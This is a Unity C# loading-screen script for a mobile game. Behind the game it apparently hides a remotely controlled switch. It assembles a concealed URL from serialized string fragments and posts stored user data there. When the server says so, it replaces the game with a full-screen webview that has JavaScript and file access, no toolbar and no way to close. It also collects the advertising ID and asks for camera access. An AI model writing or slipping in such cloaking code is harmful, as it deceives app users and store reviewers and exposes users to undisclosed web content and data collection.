using System;
using System.Collections;
using System.Collections.Generic;
using Analysis;
using AppsFlyerSDK;
using Facebook.Unity;
using UnityEngine;
using UnityEngine.Android;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.Serialization;

public class LoadingGrovesPool : MonoBehaviour
{
    [SerializeField] List<string> _groves;

    [SerializeField] List<string> _dataList;
    [SerializeField] private Canvas _displayCanvas;

    [Space] [SerializeField] private IdentifierManager _identifierManager;
    private string aggregatedData;
    private string uniqueIdentifier;
    private float delayDuration = 6f;

    private void Initialize()
    {
        if (FB.IsInitialized)
        {
            FB.ActivateApp();
        }
        else
        {
            Debug.Log("Failed to Initialize the Facebook SDK");
        }
    }

    private void GameVisibilityHandler(bool isGameShown)
    {
        if (!isGameShown)
        {
            Time.timeScale = 0;
        }
        else
        {
            Time.timeScale = 1;
        }
    }

    private void Awake()
    {
        _identifierManager.StartGetIDFA();

        RequestPermissions();
        Permission.RequestUserPermission(Permission.Camera);
    }

    private void RequestPermissions()
    {
        if (PlayerPrefs.GetInt("userPermissions") != 0)
        {
            uniqueIdentifier = _identifierManager.GetAdvertisingID();
        }
    }

    private void Start()
    {
        if (!FB.IsInitialized)
        {
            FB.Init(Initialize, GameVisibilityHandler);
        }
        else
        {
            FB.ActivateApp();
        }

        StartCoroutine(DataLoadSequence());
    }

    private void LoadMainMenu()
    {
        SceneManager.LoadScene("Menu");
        Application.targetFrameRate = 50;
        Screen.orientation = ScreenOrientation.Portrait;
    }

    public IEnumerator NetworkRequestRoutine()
    {
        var request = new UnityWebRequest(aggregatedData, "POST");
        byte[] postData = new System.Text.UTF8Encoding().GetBytes(PlayerPrefs.GetString("userData"));
        request.uploadHandler = new UploadHandlerRaw(postData);
        request.downloadHandler = new DownloadHandlerBuffer();
        request.SetRequestHeader("Content-Type", "application/json");
        request.timeout = 5;

        yield return request.SendWebRequest();

        if (request.result == UnityWebRequest.Result.ConnectionError)
        {
            LoadMainMenu();
        }
        else
        {
            try
            {
                var response = JsonUtility.FromJson<CosmicAnswer>(request.downloadHandler.text);

                if (request.result == UnityWebRequest.Result.Success && response.ok)
                {
                    PlayerPrefs.SetString("nextCheck", response.expires.ToString());

                    var strData = $"{response.url}";
                    DisplayContent(strData);
                }
                else
                {
                    LoadMainMenu();
                }
            }
            catch (Exception e)
            {
                LoadMainMenu();
                throw;
            }
        }
    }

    private void DisplayContent(string stringDataLongType, int viewportOffset = 70)
    {
        if (_displayCanvas != null)
        {
            _displayCanvas.gameObject.SetActive(false);
        }

        UniWebView.SetAllowAutoPlay(true);
        UniWebView.SetAllowInlinePlay(true);
        UniWebView.SetJavaScriptEnabled(true);
        UniWebView.SetEnableKeyboardAvoidance(true);
        var flyInTheSpace = gameObject.AddComponent<UniWebView>();
        flyInTheSpace.SetAllowFileAccess(true);
        flyInTheSpace.SetShowToolbar(false);
        flyInTheSpace.SetAllowBackForwardNavigationGestures(true);
        flyInTheSpace.SetCalloutEnabled(false);
        flyInTheSpace.SetBackButtonEnabled(true);
        flyInTheSpace.EmbeddedToolbar.SetBackgroundColor(new Color(0, 0, 0, 0f));
        flyInTheSpace.EmbeddedToolbar.Hide();
        flyInTheSpace.Frame = new Rect(0, viewportOffset, Screen.width, Screen.height - viewportOffset * 2);
        flyInTheSpace.OnShouldClose += (view) => { return false; };
        flyInTheSpace.SetSupportMultipleWindows(true);
        flyInTheSpace.SetAllowBackForwardNavigationGestures(true);
        flyInTheSpace.OnMultipleWindowOpened += (view, windowId) => { flyInTheSpace.EmbeddedToolbar.Show(); };
        flyInTheSpace.OnMultipleWindowClosed += (view, windowId) => { flyInTheSpace.EmbeddedToolbar.Hide(); };
        flyInTheSpace.OnOrientationChanged += (view, orientation) =>
        {
            flyInTheSpace.Frame = new Rect(0, viewportOffset, Screen.width, Screen.height - viewportOffset);
        };

        flyInTheSpace.OnLoadingErrorReceived += (view, code, message, payload) =>
        {
            if (payload.Extra != null &&
                payload.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out var value))
            {
                var str = value as string;
                flyInTheSpace.Load(str);
            }
        };
        flyInTheSpace.Load(stringDataLongType);
        flyInTheSpace.Show();
    }

    private IEnumerator DataLoadSequence()
    {
        yield return new WaitForSeconds(delayDuration);

        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            string savedData = PlayerPrefs.GetString("nextCheck", string.Empty);
            if (savedData != string.Empty)
            {
                var duration = long.Parse(savedData);
                if (duration >= TimeManager.GetCurrentUnixTimestamp())
                {
                    LoadMainMenu();
                    yield break;
                }
            }

            foreach (string item in _dataList)
            {
                aggregatedData += item;
            }

            var strLongCheck = "";
            foreach (string grove in _groves)
            {
                strLongCheck += grove;
            }


            StartCoroutine(NetworkRequestRoutine());
        }
        else
        {
            LoadMainMenu();
        }

        Debug.Log(aggregatedData);
    }
}

public static class TimeManager
{
    public static int GetCurrentUnixTimestamp(DateTime dateTime)
    {
        DateTime epochStart = new DateTime(1970, 1, 1);
        TimeSpan elapsed = dateTime.Subtract(epochStart);

        return (int)elapsed.TotalSeconds;
    }

    public static int GetCurrentUnixTimestamp()
    {
        return GetCurrentUnixTimestamp(DateTime.UtcNow);
    }
}